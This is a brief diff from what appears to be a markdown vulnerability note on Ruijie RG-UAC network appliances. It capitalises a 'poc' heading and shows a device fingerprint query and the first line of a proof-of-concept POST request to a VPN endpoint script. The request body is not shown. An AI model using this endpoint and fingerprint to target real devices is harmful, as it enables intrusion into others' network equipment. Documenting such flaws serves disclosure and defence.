@@ -8,7 +8,7 @@
 app="Ruijie-RG-UAC"
 ```
 
-## poc
+## POC
 
 ```
 POST /view/vpn/autovpn/sub_commit.php?action=delete HTTP/1.1
